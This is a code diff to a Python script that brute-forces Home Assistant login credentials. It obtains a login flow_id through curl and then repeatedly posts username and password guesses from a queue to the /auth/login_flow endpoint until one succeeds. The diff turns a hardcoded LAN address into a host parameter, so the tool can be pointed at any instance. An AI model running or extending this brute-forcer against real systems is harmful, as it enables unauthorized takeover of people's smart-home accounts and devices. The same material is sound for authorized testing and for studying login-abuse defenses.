@@ -16,15 +16,14 @@ import time
 
 """
     The curl command below is for getting the flow_id for logining in. Each login session is associated with a flow_id.
-        curl -d '{"client_id":"http://192.168.1.142:8123/","handler":["homeassistant",null],"redirect_uri":"http://192.168.1.142:8123/lovelace/0?auth_callback=1"}' -H 'Content-Type: text/plain;charset=UTF-8' 192.168.1.142:8123/auth/login_flow/
+        curl -d '{"client_id":"http://ip:port/","handler":["homeassistant",null],"redirect_uri":"http://ip:port/lovelace/0?auth_callback=1"}' -H 'Content-Type: text/plain;charset=UTF-8' ip:port/auth/login_flow/
     This method runs the above curl command and return the flow_id
 """
 def get_flow_id(host):
-    data = "{\"client_id\":\"http://192.168.1.142:8123/\",\"handler\":[\"homeassistant\",null],\"redirect_uri\":\"http://192.168.1.142:8123/lovelace/0?auth_callback=1\"}"
+    data = "{\"client_id\":\"http://"+ host + "/\",\"handler\":[\"homeassistant\",null],\"redirect_uri\":\"http://"+ host +"/lovelace/0?auth_callback=1\"}"
 
     headers = "-H \'Content-Type: text/plain;charset=UTF-8\'"
 
-    #host = "192.168.1.142:8123/auth/login_flow"
     host = host + "/auth/login_flow"
     result = subprocess.run(["curl", "-d", data, headers, host, "-s"], stdout=subprocess.PIPE)
     flow_id = ""
@@ -43,10 +42,11 @@ def get_flow_id(host):
 
 """
     After getting the flow_id, we can now login with this curl command:
-        curl -d '{"username":"long","password":"long","client_id":"http://192.168.1.142:8123/"}' -H 'Content-Type: text/plain;charset=UTF-8' 192.168.1.142:8123/auth/login_flow/[flow_id]
+        curl -d '{"username":"admin","password":"pass","client_id":"http://ip:port/"}' -H 'Content-Type: text/plain;charset=UTF-8' ip:port/auth/login_flow/[flow_id]
     This method runs the above curl command repeatedly with different credential each time until it finds a valid credential.
 """
 def bruceforce(flow_id, host, username, passwords_queue, credential_found, queue_ended):
+    client_id = host
     host = host + "/auth/login_flow/" + flow_id
     username = "\""+ username +"\""
     while True:
@@ -55,9 +55,9 @@ def bruceforce(flow_id, host, username, passwords_queue, credential_found, queue
             password = "\"" + queue_elem[1] + "\""
 
             count = queue_elem[0]
-            data = "{\"username\":" + username + ",\"password\":" + password + ",\"client_id\":\"http://192.168.1.142:8123/\"}"
+            data = "{\"username\":" + username + ",\"password\":" + password + ",\"client_id\":\"http://"+ client_id + "/\"}"
             # headers = "-H \'Content-Type: text/plain;charset=UTF-8\'"
-            #host = "192.168.1.142:8123/auth/login_flow/" + flow_id
+
             print("Attempt", count, ": username", username, "password", password)
             curl_output = subprocess.run(["curl", "-d", data, host, "-s"], stdout=subprocess.PIPE)
             response = curl_output.stdout.decode()
